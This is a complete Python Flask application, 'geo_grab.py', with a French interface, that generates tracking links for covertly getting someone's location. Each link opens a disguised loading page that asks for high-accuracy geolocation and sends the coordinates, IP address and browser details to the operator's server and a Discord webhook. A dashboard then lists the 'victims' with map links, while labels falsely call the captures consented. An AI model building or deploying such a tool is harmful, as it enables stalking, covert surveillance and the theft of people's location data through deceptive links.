# geo_grab.py
# Usage:
#   pip install flask requests
#   
#   python legal_geo_dashboard.py
#
# Admin localhost : http://127.0.0.1:5000/admin
# Ngrok Server : ngrok http 5000 --> https://<ngrok_url_generer>/admin


from flask import Flask, render_template_string, request, redirect, url_for
import sqlite3, os, uuid, time, requests

app = Flask(__name__)
DB = "geo_links.db"

# --------- Init DB ---------
def init_db():
    con = sqlite3.connect(DB)
    cur = con.cursor()
    cur.execute("""CREATE TABLE IF NOT EXISTS links (
        id TEXT PRIMARY KEY,
        webhook TEXT,
        label TEXT,
        created_at INTEGER
    )""")
    cur.execute("""CREATE TABLE IF NOT EXISTS events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        link_id TEXT,
        ts INTEGER,
        ip TEXT,
        ua TEXT,
        lat REAL,
        lon REAL,
        acc REAL
    )""")
    con.commit()
    con.close()
init_db()

# --------- Templates ---------
ADMIN_HTML = """
<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<script src="https://cdn.tailwindcss.com"></script>
<title>Dashboard Admin</title></head>
<body class="bg-slate-900 text-slate-100 min-h-screen p-6">
<div class="max-w-3xl mx-auto">
<h1 class="text-2xl font-bold mb-4">Générer un lien pour obtenir la localisation</h1>
<form method="post" class="space-y-3">
<label class="block text-sm">Label (optionnel)<input name="label" class="w-full mt-1 p-2 rounded bg-slate-800"></label>
<label class="block text-sm">Discord webhook URL<input name="webhook" required class="w-full mt-1 p-2 rounded bg-slate-800"></label>
<div><button class="px-4 py-2 bg-rose-500 rounded">Générer le lien</button></div>
</form>
{% if link %}
<div class="mt-6 p-4 bg-slate-800 rounded">
<div class="text-sm">Lien généré :</div>
<div class="mt-2 font-mono bg-black/30 p-2 rounded break-all"><a class="text-indigo-300" href="{{ link }}">{{ link }}</a></div>
</div>
{% endif %}
<hr class="my-6 border-slate-700">
<div><a class="text-sm text-slate-300" href="/events">Voir les victime</a></div>
</div>
</body></html>
"""

GO_HTML = """
<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Chargement…</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
  html,body{height:100%;margin:0}
</style>
</head>
<body class="bg-white flex items-center justify-center">
  <div class="flex flex-col items-center space-y-4">
    <svg class="animate-spin h-12 w-12 text-indigo-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
      <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
      <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
    </svg>
    <div class="text-gray-700 text-lg text-center">Veuillez autoriser la localisation pour continuer…</div>
  </div>

<script>
const link_id = "{{ link_id }}";

function sendLocation(coords) {
  fetch('/location/' + link_id, {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({
      lat: coords.latitude,
      lon: coords.longitude,
      acc: coords.accuracy,
      ua: navigator.userAgent
    })
  }).finally(() => {
    document.body.innerHTML = ""; // Page blanche après envoi
  });
}

window.addEventListener('load', () => {
  if (!navigator.geolocation) {
    document.querySelector('div').textContent = "Géolocalisation non supportée par votre navigateur.";
    return;
  }
  navigator.geolocation.getCurrentPosition(
    (pos) => sendLocation(pos.coords),
    (err) => {
      document.querySelector('div').textContent = "Permission refusée ou erreur.";
    },
    { enableHighAccuracy:true, maximumAge:0, timeout:15000 }
  );
});
</script>
</body>
</html>
"""


EVENTS_HTML = """
<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<script src="https://cdn.tailwindcss.com"></script>
<title>Événements consentis</title></head>
<body class="bg-slate-950 text-slate-100 min-h-screen p-6">
<div class="max-w-6xl mx-auto">
<h1 class="text-2xl font-semibold mb-4">Événements consentis</h1>
<table class="w-full text-sm border-separate border-spacing-y-2">
<thead class="text-slate-300"><tr>
<th class="text-left">Heure</th><th class="text-left">Label</th><th class="text-left">IP</th>
<th class="text-left">UA</th><th class="text-left">Lat/Lon (±m)</th><th class="text-left">Maps</th></tr></thead>
<tbody>
{% for e in rows %}
<tr class="bg-slate-900/60 rounded-xl">
<td class="py-2 pr-4">{{ e.ts_h }}</td>
<td class="py-2 pr-4">{{ e.label }}</td>
<td class="py-2 pr-4 font-mono">{{ e.ip }}</td>
<td class="py-2 pr-4 text-xs break-all">{{ e.ua }}</td>
<td class="py-2 pr-4 font-mono">{{ '%.5f'%e.lat }}, {{ '%.5f'%e.lon }} (±{{ e.acc|int }}m)</td>
<td class="py-2 pr-4"><a class="text-indigo-300 underline" href="https://www.google.com/maps?q={{ e.lat }},{{ e.lon }}" target="_blank">Maps</a></td>
</tr>
{% endfor %}
</tbody></table></div></body></html>
"""

# --------- Routes ---------
@app.route('/admin', methods=['GET','POST'])
def admin():
    link=None
    if request.method=='POST':
        label = request.form.get('label','')
        webhook = request.form.get('webhook')
        if webhook:
            link_id = str(uuid.uuid4())
            con=sqlite3.connect(DB)
            cur=con.cursor()
            cur.execute("INSERT INTO links(id,webhook,label,created_at) VALUES (?,?,?,?)",
                        (link_id, webhook, label, int(time.time())))
            con.commit(); con.close()
            link = url_for('go', link_id=link_id, _external=True)
    return render_template_string(ADMIN_HTML, link=link)

@app.route('/go/<link_id>')
def go(link_id):
    return render_template_string(GO_HTML, link_id=link_id)

@app.route('/location/<link_id>', methods=['POST'])
def location(link_id):
    data = request.get_json(force=True)
    lat = data.get('lat')
    lon = data.get('lon')
    acc = data.get('acc')
    ua = data.get('ua','')
    ip = request.remote_addr
    con=sqlite3.connect(DB)
    cur=con.cursor()
    cur.execute("INSERT INTO events(link_id,ts,ip,ua,lat,lon,acc) VALUES (?,?,?,?,?,?,?)",
                (link_id,int(time.time()),ip,ua,lat,lon,acc))
    con.commit()
    # send webhook
    cur.execute("SELECT webhook,label FROM links WHERE id=?",(link_id,))
    row=cur.fetchone()
    con.close()
    if row:
        webhook,label=row
        content=f"📍 Position consentie\nLabel: {label}\nIP: {ip}\nUA: {ua}\nLat/Lon: {lat},{lon} (±{int(acc)}m)\nMaps: https://www.google.com/maps?q={lat},{lon}"
        try:
            requests.post(webhook, json={"content": content}, timeout=8)
        except: pass
    return '',204

@app.route('/events')
def events():
    con=sqlite3.connect(DB)
    con.row_factory=sqlite3.Row
    cur=con.cursor()
    cur.execute("SELECT e.ts,e.ip,e.ua,e.lat,e.lon,e.acc,l.label FROM events e LEFT JOIN links l ON e.link_id=l.id ORDER BY e.ts DESC LIMIT 500")
    rows=[dict(ts_h=time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(r['ts'])),
               ip=r['ip'], ua=r['ua'], lat=r['lat'], lon=r['lon'], acc=r['acc'], label=r['label'] or '') for r in cur.fetchall()]
    con.close()
    return render_template_string(EVENTS_HTML, rows=rows)

if __name__=="__main__":
    app.run(host='127.0.0.1', port=5000, debug=True)
